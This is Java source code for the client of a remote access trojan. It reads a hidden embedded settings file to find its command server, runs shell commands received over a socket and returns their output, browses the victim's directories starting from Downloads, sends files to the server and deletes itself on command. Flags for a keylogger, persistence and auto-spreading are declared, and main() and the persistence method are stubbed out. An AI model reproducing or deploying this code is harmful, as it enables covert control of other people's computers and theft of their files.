package Client;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.EOFException;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import java.util.ArrayList;

public class Client {
	private static String HOST = "localhost";
	private static int PORT = 22122;
	private static boolean debugMode = true;
	private static final String SYSTEMOS = System.getProperty("os.name");
	private static boolean isPersistent = false;
	private static boolean autoSpread = false;
	private static DataOutputStream dos;
	private static File directory;
	private static DataInputStream dis;
	private static boolean keyLogger = true;

	public static void main(String[] args) throws Exception {
		// TODO: Changed: do nothing upon running.
	}

	private static String getMauscs() throws Exception {
		String jarFolder = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath())
				.getParentFile().getPath().replace('\\', '/');
		try (InputStream stream = Client.class.getResourceAsStream("/Client/.mauscs");
				OutputStream resStreamOut = new FileOutputStream(jarFolder + "/.mauscs")) {
			int readBytes;
			byte[] buffer = new byte[4096];
			while ((readBytes = stream.read(buffer)) > 0) {
				resStreamOut.write(buffer, 0, readBytes);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		return jarFolder + "/.mauscs";
	}

	private static void copyFile(File filea, File fileb) {
		InputStream inStream;
		OutputStream outStream;
		try {
			inStream = new FileInputStream(filea);
			outStream = new FileOutputStream(fileb);

			byte[] buffer = new byte[1024];

			int length;

			while ((length = inStream.read(buffer)) > 0) {
				outStream.write(buffer, 0, length);
			}

			inStream.close();
			outStream.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	private void saveClient() {
	}

	private void createPersistence(String clientPath) {

	}

	private void connect() throws InterruptedException {
		try {
			Socket socket = new Socket(HOST, PORT);
			dos = new DataOutputStream(socket.getOutputStream());
			dis = new DataInputStream(socket.getInputStream());

			while (true) {
				String input;
				try {
					input = dis.readUTF();
				} catch (EOFException e) {
					break;
				}
				if (input.contains("CMD ")) {
					exec(input.replace("CMD ", ""));
				} else if (input.contains("SYS")) {
					communicate("SYS");
					communicate(SYSTEMOS);
				} else if (input.contains("FILELIST")) {
					communicate("FILELIST");
					sendFileList();
				} else if (input.contains("DIRECTORYUP")) {
					communicate("DIRECTORYUP");
					directoryUp();
				} else if (input.contains("CHNGDIR")) {
					communicate("CHNGDIR");
					directoryChange();
				} else if (input.contains("DOWNLOAD")) {
					sendFile();
				} else if (input.contains("EXIT")) {
					communicate("EXIT");
					File f = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().getPath());
					f.deleteOnExit();
					socket.close();
					System.exit(0);
				}
			}
		} catch (Exception e) {
			Thread.sleep(1000);
			connect();
		}
	}

	private void communicate(String msg) {
		try {
			dos.writeUTF(msg);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	private void communicate(int msg) {
		try {
			dos.writeInt(msg);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	private void exec(String command) {
		if (!command.equals("")) {
			try {
				ProcessBuilder pb = null;
				if (SYSTEMOS.contains("Windows")) {
					pb = new ProcessBuilder("cmd.exe", "/c", command);
				} else if (SYSTEMOS.contains("Linux")) {
					pb = new ProcessBuilder();
				}
				if (pb != null) {
					pb.redirectErrorStream(true);
				}
				Process proc = pb.start();
				try {
					BufferedReader in = new BufferedReader(new InputStreamReader(proc.getInputStream()));
					ArrayList<String> output = new ArrayList<>();
					String line;
					while ((line = in.readLine()) != null) {
						output.add(line);
					}
					proc.waitFor();
					communicate("CMD");
					communicate(output.size());
					for (String s : output) {
						communicate(s);
					}
				} catch (IOException | InterruptedException e) {
					exec("");
				}
			} catch (IOException e) {
				exec("");
			}
		}
	}

	private void loadServerSettings() throws Exception {
		String filename = getMauscs();
		Thread.sleep(100);
		File mauscs = new File(filename);
		try (BufferedReader reader = new BufferedReader(new FileReader(mauscs))) {
			String line;
			StringBuilder stringBuilder = new StringBuilder();
			while ((line = reader.readLine()) != null) {
				stringBuilder.append(line);
			}
			String[] settings = stringBuilder.toString().split(" ");
			if (settings.length == 4) {
				HOST = (settings[0]);
				PORT = (Integer.parseInt(settings[1]));
				isPersistent = false;
				autoSpread = false;
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
		mauscs.delete();
	}

	private void directoryUp() {
		if (directory != null) {
			directory = directory.getParentFile();
		}
	}

	private void directoryChange() throws IOException {
		if (directory != null) {
			String directoryName = dis.readUTF();
			directory = new File(directory.getAbsolutePath() + "/" + directoryName);
			directory.isDirectory();
		}
	}

	private void sendFileList() {
		if (directory == null) {
			String directory = System.getProperty("user.home") + "/Downloads/";
			Client.directory = new File(directory);
			Client.directory.isDirectory();
		}
		System.out.println(directory);
		File[] files = new File(directory.getAbsolutePath()).listFiles();
		communicate(directory.getAbsolutePath());
		assert files != null;
		communicate(files.length);
		for (File file : files) {
			String name = file.getName();
			communicate(name);
		}
		communicate("END");
	}

	private void sendFile() {
		try {
			communicate("DOWNLOAD");
			String fileName = dis.readUTF();
			File filetoDownload = new File(directory.getAbsolutePath() + "/" + fileName);
			Long length = filetoDownload.length();
			dos.writeLong(length);
			dos.writeUTF(fileName);

			FileInputStream fis = new FileInputStream(filetoDownload);
			BufferedInputStream bs = new BufferedInputStream(fis);

			int fbyte;
			while ((fbyte = bs.read()) != -1) {
				dos.writeInt(fbyte);
			}
			bs.close();
			fis.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}
